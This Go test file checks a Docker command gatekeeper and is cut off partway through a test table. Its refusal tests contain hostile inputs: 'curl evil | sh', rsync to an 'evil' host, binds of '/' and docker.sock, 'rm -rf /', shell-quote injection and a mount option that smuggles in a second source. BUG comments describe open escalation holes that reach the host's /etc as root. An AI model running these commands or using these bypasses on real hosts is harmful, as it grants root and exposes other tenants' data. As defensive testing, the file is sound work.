package door

import (
	"errors"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// fakeDaemon holds containers by name and id, each with its labels.
type fakeDaemon map[string]map[string]string

func (d fakeDaemon) Inspect(target string) (string, map[string]string, error) {
	labels, ok := d[target]
	if !ok {
		return "", nil, errors.New("no such container")
	}
	copied := map[string]string{}
	for k, v := range labels {
		copied[k] = v
	}
	return target, copied, nil
}

func (d fakeDaemon) Containers() ([]string, error) {
	var ids []string
	for id := range d {
		ids = append(ids, id)
	}
	slices.Sort(ids)
	return ids, nil
}

var testDaemon = fakeDaemon{
	"mine":   {"com.docker.compose.project": "shop-prod", "traefik.enable": "true"},
	"task":   {"devopsy.env": "shop-dev", "devopsy.task": "owners"},
	"victim": {"com.docker.compose.project": "other-prod", "traefik.http.routers.x.rule": "secret", "devopsy.export.BASE": "b", "devopsy.role": "proxy"},
	"bare":   {},
}

// fakeHost is fakePaths with the door's own space.
type fakeHost struct {
	fakePaths
	dirs   map[string]bool
	copied []string
	worked int
}

func (h *fakeHost) IsDir(path string) bool { return h.dirs[path] }

func (h *fakeHost) CopyIn(path string, _ bool) (string, error) {
	h.copied = append(h.copied, path)
	return "/space/work/in/" + filepath.Base(path), nil
}

func (h *fakeHost) WorkDir() (string, error) {
	h.worked++
	return "/space/work/out", nil
}

var testKnown = Known{
	Image: "util:1", Dockerfile: "FROM alpine\n", Owners: "own script", Export: "export script", Import: "import script",
	ReflinkProbe: "probe", SnapshotTar: "tar script", Space: "space script", Share: "share script",
	Daemon: "daemon script", Restore: "restore script", RsyncCopy: []string{"rsync", "-a"}, Clone: CloneScriptForm,
}

const daemonSettings = "uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\nauth users = nobody\nsecrets file = /etc/rsyncd.secrets\n"

func decide(t *testing.T, argv ...string) (*Action, error) {
	t.Helper()
	return Decide(argv, testPolicy, testDaemon, &fakeHost{}, testKnown)
}

func TestDecideRefuses(t *testing.T) {
	t.Parallel()
	entry := "/space/mnt/shop-prod/data"
	tests := []struct {
		name string
		argv []string
	}{
		{"nothing", nil},
		{"logs of another", []string{"logs", "victim"}},
		{"cp", []string{"cp", "victim:/x", "/y"}},
		{"info", []string{"info"}},
		{"system prune", []string{"system", "prune", "-f"}},
		{"exec in its own", []string{"exec", "mine", "sh"}},
		{"exec in another, the daemon's form", []string{"exec", "victim", "rsync", "rsync://127.0.0.1/"}},
		{"inspect of another", []string{"inspect", "victim"}},
		{"inspect by a format of another", []string{"inspect", "--format", "{{json .}}", "victim"}},
		{"inspect by a format's other spelling", []string{"inspect", "--format={{json .Config.Env}}", "victim"}},
		{"inspect with a flag it does not know", []string{"inspect", "--type", "image", "mine"}},
		{"a network of another", []string{"network", "inspect", "other-prod_default"}},
		{"a network holding its name later", []string{"network", "inspect", "x-shop-prod"}},
		{"connect", []string{"network", "connect", "traefik", "mine"}},
		{"a name that only starts the same", []string{"network", "inspect", "shopx-prod_default"}},
		{"image rm, forced", []string{"image", "rm", "-f", "shop-prod-app"}},
		{"volume of another", []string{"volume", "inspect", "other-prod_data"}},
		{"volume rm", []string{"volume", "rm", "shop-prod_data"}},
		{"tag over a name others use", []string{"tag", "x", "busybox:1.37"}},
		{"tag a hold of another's", []string{"tag", "x", "busybox:devopsy-other-prod-1"}},
		{"tag with no id", []string{"tag", "x", "busybox:devopsy-shop"}},
		{"rm of another", []string{"rm", "-f", "victim"}},
		{"rm of one with no owner", []string{"rm", "bare"}},
		{"rm, a flag", []string{"rm", "--volumes", "mine"}},
		{"a build", []string{"build", "-t", "x", "-"}},
		{"a build of its image from a context", []string{"build", "-t", "util:1", "."}},
		{"a build with a build arg", []string{"build", "--build-arg", "A=1", "-t", "util:1", "-"}},
		{"any image", []string{"run", "--rm", "busybox", "sh"}},
		{"privileged", []string{"run", "--privileged", "util:1", "sh", "-c", "own script"}},
		{"a user", []string{"run", "--user", "0", "util:1", "sh", "-c", "own script"}},
		{"a capability", []string{"run", "--cap-add", "ALL", "util:1", "sh", "-c", "own script"}},
		{"pid host", []string{"run", "--pid", "host", "util:1", "sh", "-c", "own script"}},
		{"a script of its own", []string{"run", "util:1", "sh", "-c", "curl evil | sh"}},
		{"a program of its own", []string{"run", "util:1", "sh"}},
		{"a bind of the host, its own script", []string{"run", "-v", "/:/h", "util:1", "sh", "-c", "own script"}},
		{"a bind of the socket", []string{"run", "-v", "/var/run/docker.sock:/s", "util:1", "sh", "-c", "own script"}},
		{"another's entry", []string{"run", "-v", "/space/mnt/other-prod/data:/d", "util:1", "sh", "-c", "own script"}},
		{"another's mnt", []string{"run", "-v", "/space/mnt/other-prod:/d", "util:1", "sh", "-c", "own script"}},
		{"all of mnt", []string{"run", "-v", "/space/mnt:/d", "util:1", "sh", "-c", "own script"}},
		{"under an entry", []string{"run", "-v", entry + "/x:/d", "util:1", "sh", "-c", "own script"}},
		{"another's volume", []string{"run", "-v", "other-prod_data:/d", "util:1", "sh", "-c", "own script"}},
		{"bind propagation", []string{"run", "-v", entry + ":/d:rshared", "util:1", "sh", "-c", "own script"}},
		{"a mount with options", []string{"run", "--mount", "type=bind,source=" + entry + ",target=/d,bind-propagation=rshared", "util:1", "sh", "-c", "own script"}},
		{"a volume's driver options", []string{"run", "--mount", "type=volume,source=shop-prod_v,target=/d,volume-opt=device=/", "util:1", "sh", "-c", "own script"}},
		{"tmpfs", []string{"run", "--mount", "type=tmpfs,target=/d", "util:1", "sh", "-c", "own script"}},
		{"the host's network for a script", []string{"run", "--network", "host", "util:1", "sh", "-c", "own script"}},
		{"another's network", []string{"run", "--network", "other-prod_default", "util:1", "sh", "-c", "own script"}},
		{"the host's network to anywhere", []string{"run", "--network", "host", "util:1", "rsync", "-a", "rsync://evil:873/x/", "/mnt/x/"}},
		{"rsync out of its form", []string{"run", "util:1", "rsync", "-a", "--rsh=evil", "/src/x/", "/dst/x/"}},
		{"rsync from a path", []string{"run", "util:1", "rsync", "-a", "/etc/", "/dst/x/"}},
		{"another's label", []string{"run", "--label", "devopsy.env=other-prod", "util:1", "sh", "-c", "own script"}},
		{"a label of its choosing", []string{"run", "--label", "traefik.enable=true", "util:1", "sh", "-c", "own script"}},
		{"another's name, no label", []string{"run", "--name", "devopsy-owners-other-prod-1", "util:1", "sh", "-c", "own script"}},
		{"a name of another's", []string{"run", "--name", "other-prod-web-1", "--label", "devopsy.env=shop-prod", "util:1", "sh", "-c", "own script"}},
		{"an environment", []string{"run", "-e", "A=1", "util:1", "sh", "-c", "own script"}},
		{"its daemon's settings for its own script", []string{"run", "-e", "RSYNCD_CONF=uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n", "util:1", "sh", "-c", "own script"}},
		{"a daemon with another's settings", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=uid = 0\n[x]\npath = /", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon with no auth", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n[x]\npath = /mnt/x\n", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon writing", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + strings.Replace(daemonSettings, "read only = yes", "read only = no", 1), "util:1", "sh", "-c", "daemon script"}},
		{"a daemon serving the host", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings + "[x]\npath = /etc\n", "-e", "RSYNC_SECRET", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon with no settings", []string{"run", "util:1", "sh", "-c", "daemon script"}},
		{"a daemon published to the world", []string{"run", "-p", "873:873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
		{"a port with no daemon", []string{"run", "-p", "127.0.0.1::873", "util:1", "sh", "-c", "own script"}},
		{"a password for its own script", []string{"run", "-e", "RSYNC_PASSWORD", "util:1", "sh", "-c", "own script"}},
		{"a secret in the command line", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD=x", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"}},
		{"a receive with no password", []string{"run", "--network", "host", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"}},
		{"a daemon with no password", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
		{"a volume of another's", []string{"volume", "create", "--label", "com.docker.compose.project=other-prod", "--label", "com.docker.compose.volume=d", "other-prod_d"}},
		{"a volume with options", []string{"volume", "create", "-o", "device=/", "--label", "com.docker.compose.volume=d", "shop-prod_d"}},
		{"a pull with a flag", []string{"pull", "--platform", "x", "busybox"}},
		{"the port of another's", []string{"port", "victim", "873"}},
		{"a clone script running more", []string{"run", "-v", "/space/clones/shop/a:/c", "util:1", "sh", "-c", "set -e\nmkdir -p /c/mnt /c/volumes\ncurl evil | sh\n"}},
		{"a clone from outside /m", []string{"run", "-v", "/space/clones/shop/a:/c", "util:1", "sh", "-c", "set -e\nmkdir -p /c/mnt /c/volumes\ncp -a --reflink=always '/etc' '/c/mnt/' || cp -a --reflink=always '/etc' '/c/mnt/'\n"}},
		{"another's clones", []string{"run", "-v", "/space/clones/other/a:/c", "util:1", "sh", "-c", "own script"}},
		{"all clones", []string{"run", "-v", "/space/clones:/c", "util:1", "sh", "-c", "own script"}},
		{"du of the parent", []string{"run", "-v", "/space/mnt/shop-prod:/m", "util:1", "du", "-sk", "/m/.."}},
		{"rsync of the parent", []string{"run", "-v", "/space/mnt/shop-prod:/src", "util:1", "rsync", "-a", "/src/../", "/dst/x/"}},
		{"a removal of the parent", []string{"run", "-v", "/space/mnt/shop-prod:/s", "util:1", "rm", "-rf", "/s/.."}},
		{"a removal outside its form", []string{"run", "-v", "/home/devopsy-shop/shop/prod/s:/s", "util:1", "rm", "-rf", "/s/../../x"}},
		{"a restore of another's file", []string{"run", "-v", "/home/devopsy-other/other/x:/s:ro", "-v", "/home/devopsy-shop/shop/f:/o", "util:1", "sh", "-c", "restore script", "sh", "f"}},
		{"a restore's file walking out", []string{"run", "-v", "/home/devopsy-shop/shop/s:/s:ro", "-v", "/home/devopsy-shop/shop/f:/o", "util:1", "sh", "-c", "restore script", "sh", "../../x"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a, err := decide(t, tt.argv...)
			var r *Refusal
			if !errors.As(err, &r) {
				t.Errorf("not refused: %+v, %v", a, err)
			}
		})
	}
}

// Filters widen each other, so a listing is cut by id whatever they say.
func TestDecidePS(t *testing.T) {
	t.Parallel()
	cut := []string{"--filter", "id=mine", "--filter", "id=task"}
	tests := []struct {
		name string
		args []string
		want []string
	}{
		{"nothing", nil, cut},
		{"a name filter of its own, widened", []string{"--filter", "name=shop-prod", "--filter", "name=victim"}, cut},
		{"a label filter that only looks like its own", []string{"--filter", "label=x=shop-prod"}, cut},
		{"a label of its own, widened by another's", []string{"--filter", "label=com.docker.compose.project=shop-prod", "--filter", "label=com.docker.compose.project=other-prod"}, cut},
		{"all, with its format", []string{"-a", "--format", "{{.Labels}}"}, cut},
		{"a role's holder, with more of it", []string{"--filter", "label=devopsy.role=proxy", "--format", "{{.Labels}}"}, cut},
		{"imports' look, with more", []string{"-q", "--no-trunc", "-a", "--filter", "name=x"}, cut},
		// Filters of one key widen each other: a caller's id filter beside the door's own
		// would bring another's row back, all its labels included. Docker's CLI trims a
		// filter's key and lowercases it, so every spelling of id goes.
		{"an id filter of another's", []string{"-a", "--filter", "id=victim", "--format", "{{.Labels}}"}, cut},
		{"an id filter in capitals", []string{"-a", "--filter", "ID=victim", "--format", "{{.Labels}}"}, cut},
		{"an id filter in mixed case", []string{"-a", "--filter=Id=victim", "--format", "{{json .}}"}, cut},
		{"an id filter with spaces", []string{"-a", "--filter", " id =victim"}, cut},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a, err := decide(t, append([]string{"ps"}, tt.args...)...)
			if err != nil {
				t.Fatal(err)
			}
			got := a.Docker[len(a.Docker)-len(tt.want):]
			if !slices.Equal(got, tt.want) {
				t.Errorf("ends %q, want %q", got, tt.want)
			}
			for _, arg := range a.Docker {
				key, value, _ := strings.Cut(arg, "=")
				if strings.ToLower(strings.TrimSpace(key)) == "id" && (strings.Contains(value, "victim") || strings.Contains(value, "bare")) {
					t.Errorf("reaches another's: %q", a.Docker)
				}
			}
		})
	}
	// devopsy's own looks, which tell nothing.
	for _, args := range [][]string{
		{"-q", "--no-trunc"},
		{"--filter", "label=devopsy.role=proxy", "--format", `{{.Label "com.docker.compose.project"}}`},
	} {
		a, err := decide(t, append([]string{"ps"}, args...)...)
		if err != nil || slices.Contains(a.Docker, "id=mine") {
			t.Errorf("%q: %v, %v", args, a, err)
		}
	}
	// With nothing of its own: its format and no rows, never everyone's.
	a, err := Decide([]string{"ps"}, Policy{Project: "empty"}, testDaemon, &fakeHost{}, testKnown)
	if err != nil || !slices.Contains(a.Docker, "id=0000000000000000") {
		t.Errorf("nothing of its own: %v, %v", a, err)
	}
}

func TestDecideInspectLabels(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "inspect", "--format", "{{.Id}} {{json .Config.Labels}}", "mine", "victim", "gone")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(a.Output, "traefik.enable") {
		t.Errorf("its own labels are cut: %s", a.Output)
	}
	if strings.Contains(a.Output, "secret") {
		t.Errorf("another's unexported labels show: %s", a.Output)
	}
	if !strings.Contains(a.Output, `"devopsy.export.BASE":"b"`) || !strings.Contains(a.Output, `"devopsy.role":"proxy"`) {
		t.Errorf("another's exports are missing: %s", a.Output)
	}
	if strings.Contains(a.Output, "gone") {
		t.Errorf("a missing container shows: %s", a.Output)
	}
}

func TestDecideAllows(t *testing.T) {
	t.Parallel()
	entry := "/space/mnt/shop-prod/data"
	for _, argv := range [][]string{
		{"version"},
		{"inspect", "mine"},
		{"inspect", "--format", "{{.Id}}", "mine", "task"},
		{"network", "inspect", "-f", "x", "shop-prod_default"},
		{"network", "inspect", "traefik"},
		{"image", "inspect", "--format", "{{json .}}", "busybox:1.37"},
		{"image", "rm", "busybox:devopsy-shop-prod-1", "shop-prod-app:latest"},
		{"volume", "inspect", "--format", "{{.Name}}", "shop-prod_data"},
		{"tag", "sha256:abc", "busybox:devopsy-shop-prod-20260101"},
		{"rm", "-f", "mine"},
		{"exec", "task", "rsync", "rsync://127.0.0.1/"},
		{"run", "--rm", "--name", "devopsy-owners-1", "--label", "devopsy.env=shop-prod", "--label", "devopsy.task=owners", "--network", "none",
			"--mount", "type=bind,source=" + entry + ",target=/mnt/data", "util:1", "sh", "-c", "own script", "sh", "data", "10001:10001"},
		{"run", "--mount", "type=bind,source=" + entry + ",target=/x/data,readonly", "-v", "shop-prod_db:/x/db:ro", "util:1", "sh", "-c", "export script", "sh", "data", "db"},
		{"run", "--network", "none", "--mount", "type=bind,source=" + entry + ",target=/mnt/data", "--mount", "type=bind,source=/home/devopsy-shop/shop/prod/t.tar,target=/in/t.tar,readonly", "util:1", "sh", "-c", "import script", "sh", "/in/t.tar", "data", "data", "./data/x"},
		{"run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", "/home/devopsy-shop/shop/prod/snapshots/1.tmp/data:/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "mnt.data.tar.zst", "1:2"},
		{"run", "--mount", "type=bind,source=" + entry + ",target=/s,readonly", "--mount", "type=bind,source=/space/mnt/shop-dev/data,target=/d", "util:1", "sh", "-c", "share script", "sh", "/s", "/d"},
		{"run", "-v", "/space/mnt/shop-prod:/m:ro", "-v", "shop-prod_db:/v/db:ro", "util:1", "du", "-sk", "/m/data", "/v/db"},
		{"run", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "find", "/mnt", "-mindepth", "1", "-delete"},
		{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--chown=1:1", "/src/data/", "/dst/data/"},
		{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"},
		{"run", "-d", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings + "[data]\npath = /mnt/data\n[app.ini]\npath = /mnt\ninclude = /app.ini\nexclude = *\n", "-e", "RSYNC_SECRET", "-v", "/space/mnt/shop-prod:/mnt:ro", "util:1", "sh", "-c", "daemon script"},
		{"port", "task", "873"},
		{"run", "-v", "/space/clones/shop/abc/mnt:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"},
		{"run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", "/space/clones/shop/abc:/c", "util:1", "sh", "-c", "probe", "sh", "/m/mnt/data"},
	} {
		if _, err := decide(t, argv...); err != nil {
			t.Errorf("%q: %v", argv, err)
		}
	}
}

// BUG: parseMount splits a caller's --mount on commas, but place's answer is put back
// into one unquoted. A link in the tree to a path holding `,source=/etc` passes as a
// clone or an entry of this project's, and Docker takes the last source: a root util
// container then holds any host path.
func TestDecideRunMountSourceStaysOnePath(t *testing.T) {
	t.Parallel()
	link := "/home/devopsy-shop/shop/prod/link"
	for _, end := range []string{"/space/clones/shop/a,source=/etc", "/space/mnt/shop-a,source=/etc"} {
		host := &fakeHost{fakePaths: fakePaths{links: map[string]string{link: end}}}
		a, err := Decide([]string{"run", "--mount", "type=bind,source=" + link + ",target=/x", "util:1", "sh", "-c", "own script"}, testPolicy, testDaemon, host, testKnown)
		if err == nil {
			t.Errorf("%s: a second source reaches docker: %q", end, a.Docker)
		}
	}
}

// BUG: a mount's target is never checked, so a project's files, copied in read-only, can
// sit over the util image's own binaries: "own script" then runs the project's find or
// rsync as root, with --network host on a sync's receive. A util container runs only
// what devopsy gives it (internals/door.md).
func TestDecideRunTargetsLeaveTheImageAlone(t *testing.T) {
	t.Parallel()
	bin := "/home/devopsy-shop/shop/prod/bin"
	for _, target := range []string{"/usr/bin", "/bin", "/lib", "/etc"} {
		if a, err := decide(t, "run", "-v", bin+":"+target+":ro", "util:1", "sh", "-c", "own script"); err == nil {
			t.Errorf("a project's files over %s: %q", target, a.Docker)
		}
	}
	if a, err := decide(t, "run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", bin+":/usr/bin:ro", "-v", "/space/mnt/shop-prod:/mnt",
		"util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"); err == nil {
		t.Errorf("a project's rsync, as root on the host's network: %q", a.Docker)
	}
}

// BUG: what devopsy itself asks and the door has no answer for, so a project user's
// release fails there: ensureVolumes (--import into a missing volume, a child's prepare,
// --reset after its down --volumes), and images' Pull (a rollback or restart whose image
// is gone from the server, a restore's landing). TestDoorKnowsDevopsysDockerCalls only
// looks at `UtilImage, "sh", "-c"`, so it does not see these.
func TestDecideAnswersWhatDevopsyAsks(t *testing.T) {
	t.Parallel()
	for _, argv := range [][]string{
		{"volume", "create", "--label", "com.docker.compose.project=shop-prod", "--label", "com.docker.compose.volume=data", "shop-prod_data"},
		{"pull", "-q", "busybox@sha256:abc"},
	} {
		if _, err := decide(t, argv...); err != nil {
			t.Errorf("%q: %v", argv, err)
		}
	}
}

// A root container never holds a path a project user can change: what is read is
// copied in by that user's rights, what is written goes back by them, and what the
// container runs gives up what it does not need.
func TestDecideRunKeepsRootOffTheTree(t *testing.T) {
	t.Parallel()
	tree := "/home/devopsy-shop/shop/prod"
	host := &fakeHost{}
	a, err := Decide([]string{"run", "-v", tree + "/stream:/in/stream:ro", "-v", "/space/mnt/shop-prod/data:/mnt/data",
		"util:1", "sh", "-c", "import script", "sh", "/in/stream", "data", "data"}, testPolicy, testDaemon, host, testKnown)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(a.Docker, " ")
	if strings.Contains(joined, tree) {
		t.Errorf("a root container holds the tree: %s", joined)
	}
	for _, want := range []string{"/space/work/in/stream:/in/stream:ro", "/space/mnt/shop-prod/data:/mnt/data", "--network none", "--cap-drop MKNOD", "--security-opt no-new-privileges"} {
		if !strings.Contains(joined, want) {
			t.Errorf("no %q in %s", want, joined)
		}
	}
	// A tar's output goes back by that user's rights.
	a, err = decide(t, "run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", tree+"/out:/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "f.zst", "1:2")
	if err != nil {
		t.Fatal(err)
	}
	if len(a.Collect) != 1 || a.Collect[0] != (Collect{"/space/work/out", tree + "/out"}) {
		t.Errorf("what goes back: %+v", a.Collect)
	}
	if len(host.copied) != 1 || host.copied[0] != tree+"/stream" {
		t.Errorf("what comes in: %v", host.copied)
	}
	// A path the project user swapped out of its tree.
	host = &fakeHost{fakePaths: fakePaths{links: map[string]string{tree + "/out": "/etc"}}}
	if _, err := Decide([]string{"run", "-v", tree + "/out:/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "f.zst", "1:2"}, testPolicy, testDaemon, host, testKnown); err == nil {
		t.Error("a link out of its tree went through")
	}
	// A removal in its tree is its own to do.
	a, err = decide(t, "run", "-v", tree+"/snapshots:/s", "util:1", "rm", "-rf", "/s/.clone")
	if err != nil || len(a.Docker) != 0 || !slices.Equal(a.Remove, []string{tree + "/snapshots/.clone"}) {
		t.Errorf("a removal: %+v, %v", a, err)
	}
	// Whether its tree takes reflinks: no.
	a, err = decide(t, "run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", tree+"/snapshots/.clone:/c", "util:1", "sh", "-c", "probe", "sh", "/m/mnt/data")
	if err != nil || a.Exit != 1 || len(a.Docker) != 0 {
		t.Errorf("a reflink probe: %+v, %v", a, err)
	}
	// A restore holds nothing at all.
	a, err = decide(t, "run", "--name", "shop-prod-x", "-v", tree+"/s/data:/s:ro", "-v", tree+"/s/fifo:/o", "util:1", "sh", "-c", "restore script", "sh", "f.zst")
	if err != nil || a.Stream == nil {
		t.Fatalf("a restore: %+v, %v", a, err)
	}
	if a.Stream.From != tree+"/s/data/f.zst" || a.Stream.To != tree+"/s/fifo/tar" {
		t.Errorf("its ends: %+v", a.Stream)
	}
	if strings.Contains(strings.Join(a.Stream.Docker, " "), tree) || !slices.Contains(a.Stream.Docker, "ALL") {
		t.Errorf("its container: %q", a.Stream.Docker)
	}
}

// The util image comes from the door's Dockerfile, whatever arrives on stdin.
func TestDecideBuildsItsOwnDockerfile(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "build", "-q", "--pull", "--no-cache", "-t", "util:1", "-")
	if err != nil {
		t.Fatal(err)
	}
	if a.Stdin != testKnown.Dockerfile {
		t.Errorf("builds from %q", a.Stdin)
	}
}

// Read, an admin's grant, opens reads and nothing else.
func TestDecideReadAll(t *testing.T) {
	t.Parallel()
	p := testPolicy
	p.ReadAll = true
	for _, argv := range [][]string{{"ps", "-a"}, {"inspect", "victim"}, {"network", "ls"}, {"network", "inspect", "other-prod_default"}} {
		a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown)
		if err != nil || !slices.Equal(a.Docker, argv) {
			t.Errorf("%q: %+v, %v", argv, a, err)
		}
	}
	for _, argv := range [][]string{{"exec", "victim", "sh"}, {"logs", "victim"}, {"rm", "-f", "victim"}, {"network", "connect", "x", "victim"}, {"tag", "x", "busybox:1.37"}} {
		if a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown); err == nil {
			t.Errorf("%q: %+v", argv, a)
		}
	}
}

// A clone's real script, whose names come from a project's labels.
func TestCloneScriptForm(t *testing.T) {
	t.Parallel()
	good := "set -e\nmkdir -p /c/mnt /c/volumes\ncp -a --reflink=always '/m/mnt/data' '/c/mnt/' || cp -a --reflink=always '/m/mnt/data' '/c/mnt/'\nmkdir -p '/c/volumes/db'\ncp -a --reflink=always '/m/volumes/db/.' '/c/volumes/db/' || cp -a --reflink=always '/m/volumes/db/.' '/c/volumes/db/'\n"
	if !CloneScriptForm(good) {
		t.Error("its own form is refused")
	}
	for _, bad := range []string{
		"", "set -e\n", "curl evil\n" + good,
		good + "rm -rf /\n",
		strings.Replace(good, "/m/mnt/data", "/m/mnt/../..", 2),
		strings.Replace(good, "data", "x'; evil; '", 1),
		strings.Replace(good, "'/c/mnt/'", "'/etc/'", 1),
	} {
		if CloneScriptForm(bad) {
			t.Errorf("taken: %q", bad)
		}
	}
}

// A removal goes by where the path ends: root's for a clone behind its link, the
// project user's in its tree, and neither anywhere else.
func TestDecideRunRemovals(t *testing.T) {
	t.Parallel()
	snaps := "/home/devopsy-shop/shop/prod/snapshots"
	clones := "/space/clones/shop/abc"
	host := &fakeHost{fakePaths: fakePaths{links: map[string]string{snaps + "/.clone": clones, snaps + "/.clone/1": clones + "/1", snaps + "/out": "/etc"}}}
	run := func(paths ...string) (*Action, error) {
		return Decide(append([]string{"run", "-v", snaps + ":/s", "util:1", "rm", "-rf"}, paths...), testPolicy, testDaemon, host, testKnown)
	}
	a, err := run("/s/.clone/1")
	if err != nil || !slices.Contains(a.Docker, "/s/abc/1") || len(a.Remove) != 0 {
		t.Errorf("a clone by id: %+v, %v", a, err)
	}
	a, err = run("/s/.clone")
	if err != nil || !slices.Contains(a.Docker, "/s/abc") || !slices.Equal(a.Remove, []string{snaps + "/.clone"}) {
		t.Errorf("the clones and their link: %+v, %v", a, err)
	}
	a, err = run("/s/1.tmp")
	if err != nil || len(a.Docker) != 0 || !slices.Equal(a.Remove, []string{snaps + "/1.tmp"}) {
		t.Errorf("its own: %+v, %v", a, err)
	}
	if a, err = run("/s/out"); err == nil {
		t.Errorf("a link out of its tree: %+v", a)
	}
}

// What of the image store is the server's is the admin's: for a project user there is
// nothing to do, nothing was refused for it, and a release says nothing about it.
func TestDecideImagePruneAndOthersDoNothing(t *testing.T) {
	t.Parallel()
	for _, argv := range [][]string{{"image", "prune", "-f"}, {"image", "rm", "busybox:1.37"}, {"image", "rm", "other-prod-app"}} {
		a, err := decide(t, argv...)
		if err != nil || len(a.Docker) != 0 || a.Exit != 0 {
			t.Errorf("%q: %+v, %v", argv, a, err)
		}
	}
}

// A secret comes by name. Its value on stdin is the door's to read, never a word.
func TestDecideRunSecretByName(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/")
	if err != nil || a.Secret != "RSYNC_PASSWORD" {
		t.Errorf("%+v, %v", a, err)
	}
}

// A read-only copy goes after its container: nothing stays in the door's space.
func TestDecideRunCleansUp(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "run", "-v", "/home/devopsy-shop/shop/prod/stream:/in/stream:ro", "-v", "/space/mnt/shop-prod/data:/mnt/data", "util:1", "sh", "-c", "import script", "sh", "/in/stream", "data", "data")
	if err != nil || !slices.Equal(a.Cleanup, []string{"/space/work/in"}) {
		t.Errorf("%+v, %v", a, err)
	}
}

// Names are flat: a project extending this one's name is not this one's.
func TestOwnNameLeavesLongerProjects(t *testing.T) {
	t.Parallel()
	p := Policy{Project: "shop", Others: []string{"shop-eu", "other", "sh"}}
	for name, want := range map[string]bool{"shop-prod": true, "shop-eu": false, "shop-eu-prod": false, "shop-eur-prod": true, "other-prod": false, "shop": false} {
		if p.OwnName(name) != want {
			t.Errorf("%s: want %v", name, want)
		}
	}
}

// BUG: mountSource is checked only for a source starting with `/`, so a bare word passes
// as this project's volume whatever follows its name, and goes back into a --mount
// unquoted: Docker takes the last source, the host's /etc here, rw, in a root util
// container. Run by hand: Docker takes `type=bind,source=shop-x,source=/etc,target=/mnt`.
func TestDecideRunBareSourceStaysOnePath(t *testing.T) {
	t.Parallel()
	for _, kind := range []string{"bind", "volume"} {
		v := "type=" + kind + `,"source=shop-x,source=/etc",target=/mnt`
		if a, err := decide(t, "run", "--mount", v, "util:1", "sh", "-c", "own script"); err == nil {
			t.Errorf("%s: a second source reaches docker: %q", kind, a.Docker)
		}
	}
}

// BUG: flagValues knows `-f x` and `-f=x`, not `-fx`, and whatever it leaves goes to
// docker as it is: `-fid=<another's>` widens the listing the door's own id filters cut.
func TestDecidePSCutsAShortFilter(t *testing.T) {
	t.Parallel()
	a, err := decide(t, "ps", "-a", "-fid=victim", "--format", "{{json .}}")
	if err != nil {
		return
	}
	for _, arg := range a.Docker {
		if strings.Contains(arg, "victim") {
			t.Errorf("another's id reaches docker: %q", a.Docker)
		}
	}
}

// An rsync that names a whole mnt gets only the entry it writes: what it copies cannot
// leave a link at the top, where a bind's source goes by.
func TestDecideRunNarrowsAnRsync(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		argv []string
		want string
		file bool
	}{
		{"a local entry", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"}, "/space/mnt/shop-dev/data:/dst/data", false},
		{"a local file", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--inplace", "/src/app.ini", "/dst/"}, "/space/mnt/shop-dev/app.ini:/dst/app.ini", true},
		{"a receive", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9/data/", "/mnt/data/"}, "/space/mnt/shop-prod/data:/mnt/data", false},
